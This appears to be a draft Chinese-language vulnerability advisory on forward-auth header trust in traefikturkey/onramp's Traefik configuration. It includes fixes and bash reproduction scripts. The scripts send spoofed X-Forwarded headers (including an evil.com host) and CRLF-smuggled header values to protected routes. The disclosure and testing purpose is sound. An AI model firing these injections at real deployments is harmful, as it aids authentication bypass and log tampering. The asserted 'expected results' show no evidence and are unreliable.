# CVE-2025-XXXXX: Forward Auth Header Injection in traefikturkey/onramp Traefik Configuration

## 基本信息

- **CVE ID**: CVE-2025-XXXXX (待分配)
- **项目**: traefikturkey/onramp
- **发现日期**: 2025-12-28
- **报告者**: Security Research
- **严重程度**: High (CVSS 7.5)
- **项目星级**: 113 stars

## 漏洞描述

traefikturkey/onramp 项目中的多个 Traefik Forward Auth 中间件配置存在 HTTP Header Injection 漏洞。多个配置文件中都设置了 `trustForwardHeader: true` 但没有配置 `trustedIPs` 白名单，导致 Traefik 信任所有来源的 X-Forwarded-* 头并转发到认证服务。

## 受影响文件

- `services-available/authelia.yml`
- `services-available/authentik.yml`
- `etc/traefik/available/authentik_middleware.yml`
- `etc/traefik/available/crowdsec-bouncer.yml`

## 漏洞配置

所有受影响文件都包含类似的配置：

```yaml
labels:
  - "traefik.http.middlewares.authelia.forwardauth.trustForwardHeader=true"
  # 或
  - "traefik.http.middlewares.authentik.forwardauth.trustForwardHeader=true"
```

## 漏洞详情

### 问题分析

1. **配置问题**: 4 个不同的认证中间件都配置了 `trustForwardHeader: true` 且**没有配置 trustedIPs**
2. **影响**: Traefik 会信任**所有来源**的 X-Forwarded-* 头并转发到认证服务
3. **攻击向量**: 攻击者可以直接向 Traefik 发送恶意请求
4. **影响范围**: 4 个认证中间件受影响（Authelia, Authentik, CrowdSec）

### 攻击场景

同 CVE-2025-XXXXX-traefik-crowdsec-bouncer

## 影响评估

### CVSS 3.1 评分

- **Base Score**: 7.5 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N

### 实际影响

1. **日志注入** ✅ **几乎肯定发生**
2. **IP 欺骗** ✅ **很可能发生**
3. **认证绕过** ⚠️ **可能发生**
4. **影响范围大** - 4 个认证中间件受影响

## 威胁模型

同 CVE-2025-XXXXX-traefik-crowdsec-bouncer

## 修复建议

### 方案 1: 移除 trustForwardHeader 配置（推荐）

在所有受影响文件中移除 `trustForwardHeader: true` 配置。

### 方案 2: 配置 trustedIPs 白名单

需要在 Traefik 的全局配置中设置 trustedIPs。

## 漏洞复现

### 环境准备

1. **克隆项目仓库**:
   ```bash
   git clone https://github.com/traefikturkey/onramp.git
   cd onramp
   ```

2. **检查漏洞配置**:
   ```bash
   # 查找所有包含 trustForwardHeader 的文件
   find . -name "*.yml" -o -name "*.yaml" | xargs grep -l "trustForwardHeader"
   
   # 查看受影响文件
   cat services-available/authelia.yml | grep -A 5 -B 5 "trustForwardHeader"
   cat services-available/authentik.yml | grep -A 5 -B 5 "trustForwardHeader"
   ```

3. **启动服务**:
   ```bash
   # 启动包含 Traefik 的服务
   docker-compose -f services-available/authelia.yml up -d
   # 或
   docker-compose -f services-available/authentik.yml up -d
   ```

### 漏洞复现步骤

#### 步骤 1: 确认多个认证中间件的漏洞配置

```bash
# 列出所有受影响的服务文件
echo "Affected authentication middlewares:"
echo "  1. services-available/authelia.yml"
echo "  2. services-available/authentik.yml"
echo "  3. etc/traefik/available/authentik_middleware.yml"
echo "  4. etc/traefik/available/crowdsec-bouncer.yml"

# 检查 Authelia 中间件配置
docker inspect $(docker-compose -f services-available/authelia.yml ps -q traefik 2>/dev/null) | jq '.[0].Config.Labels' | grep -i "authelia" | grep -i "forward"
```

#### 步骤 2: 测试 Authelia Forward Auth Header Injection

```bash
# 获取 Traefik 服务地址
TRAEFIK_IP=$(docker-compose -f services-available/authelia.yml ps -q traefik 2>/dev/null | xargs docker inspect 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null)

# 测试访问受 Authelia 保护的路由
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Forwarded-Host: evil.com" \
     http://$TRAEFIK_IP:80/protected

# 注入恶意头到 Authelia 认证服务
curl -v -H "X-Forwarded-For: 127.0.0.1\r\nX-Injected-Auth: malicious" \
     http://$TRAEFIK_IP:80/protected
```

#### 步骤 3: 测试 Authentik Forward Auth Header Injection

```bash
# 切换到 Authentik 配置
TRAEFIK_IP=$(docker-compose -f services-available/authentik.yml ps -q traefik 2>/dev/null | xargs docker inspect 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null)

# 测试访问受 Authentik 保护的路由
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Forwarded-Host: evil.com" \
     http://$TRAEFIK_IP:80/protected

# 注入恶意头到 Authentik 认证服务
curl -v -H "X-Forwarded-For: 127.0.0.1\r\nX-Injected-Auth: malicious" \
     http://$TRAEFIK_IP:80/protected
```

#### 步骤 4: 测试 CrowdSec Bouncer Forward Auth Header Injection

```bash
# 如果部署了 CrowdSec
TRAEFIK_IP=$(docker-compose -f etc/traefik/available/crowdsec-bouncer.yml ps -q traefik 2>/dev/null | xargs docker inspect 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null)

# 测试 CrowdSec 认证
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Injected-Auth: malicious" \
     http://$TRAEFIK_IP:80/protected
```

#### 步骤 5: 批量测试所有认证中间件

```bash
#!/bin/bash
# 测试所有 4 个认证中间件

MIDDLEWARES=(
    "services-available/authelia.yml:Authelia"
    "services-available/authentik.yml:Authentik"
    "etc/traefik/available/authentik_middleware.yml:Authentik-Middleware"
    "etc/traefik/available/crowdsec-bouncer.yml:CrowdSec"
)

for middleware in "${MIDDLEWARES[@]}"; do
    FILE=$(echo $middleware | cut -d: -f1)
    NAME=$(echo $middleware | cut -d: -f2)
    
    echo "[*] Testing $NAME middleware: $FILE"
    
    if [ -f "$FILE" ]; then
        docker-compose -f "$FILE" up -d 2>/dev/null
        
        TRAEFIK_IP=$(docker-compose -f "$FILE" ps -q traefik 2>/dev/null | xargs docker inspect 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null)
        
        if [ ! -z "$TRAEFIK_IP" ] && [ "$TRAEFIK_IP" != "null" ]; then
            curl -s -H "X-Forwarded-For: 127.0.0.1" \
                 -H "X-Injected-Test: vulnerability-exists" \
                 http://$TRAEFIK_IP:80/protected > /dev/null
            
            echo "  [+] Tested: $TRAEFIK_IP"
        fi
        
        docker-compose -f "$FILE" down 2>/dev/null
    fi
done
```

#### 步骤 6: 验证漏洞

```bash
# 检查 Authelia 日志
docker-compose -f services-available/authelia.yml logs authelia | grep -i "forwarded" | tail -20

# 检查 Authentik 日志
docker-compose -f services-available/authentik.yml logs authentik | grep -i "forwarded" | tail -20

# 检查 CrowdSec 日志
docker-compose -f etc/traefik/available/crowdsec-bouncer.yml logs crowdsec | grep -i "forwarded" | tail -20

# 检查 Traefik 日志
docker-compose -f services-available/authelia.yml logs traefik | tail -30
```

### 预期结果

1. **4 个认证中间件都受影响**: Authelia, Authentik (2个配置), CrowdSec
2. **日志注入成功**: 每个认证服务的日志中都包含注入的恶意内容
3. **IP 欺骗成功**: 每个认证服务都允许 IP 欺骗
4. **攻击面大**: 由于多个认证中间件受影响，攻击面显著增大

### 自动化测试脚本

```bash
#!/bin/bash
echo "[*] Testing Forward Auth Header Injection in Multiple Middlewares"
echo "[*] This project has 4 affected authentication middlewares"

# 测试第一个中间件作为示例
FILE="services-available/authelia.yml"
echo "[*] Testing example middleware: Authelia"

docker-compose -f "$FILE" up -d 2>/dev/null

TRAEFIK_IP=$(docker-compose -f "$FILE" ps -q traefik 2>/dev/null | xargs docker inspect 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null)

if [ ! -z "$TRAEFIK_IP" ] && [ "$TRAEFIK_IP" != "null" ]; then
    echo "[+] Test 1: Basic injection"
    curl -s -H "X-Forwarded-For: 127.0.0.1" \
         -H "X-Injected-Test: vulnerability-exists" \
         http://$TRAEFIK_IP:80/protected > /dev/null
    
    echo "[+] Test 2: IP spoofing"
    curl -s -H "X-Forwarded-For: 10.0.0.1" \
         http://$TRAEFIK_IP:80/protected > /dev/null
    
    echo "[*] Check logs: docker-compose -f $FILE logs authelia"
fi

docker-compose -f "$FILE" down 2>/dev/null
```

### 影响范围说明

由于该项目有 **4 个认证中间件**都使用相同的漏洞配置，影响范围包括：

1. **Authelia** (`services-available/authelia.yml`)
2. **Authentik** (`services-available/authentik.yml`)
3. **Authentik Middleware** (`etc/traefik/available/authentik_middleware.yml`)
4. **CrowdSec Bouncer** (`etc/traefik/available/crowdsec-bouncer.yml`)

每个认证中间件都需要单独修复。

## 备注

这是实际项目配置（113 stars），4 个认证中间件都受影响，攻击面大。建议尽快修复所有受影响的服务。

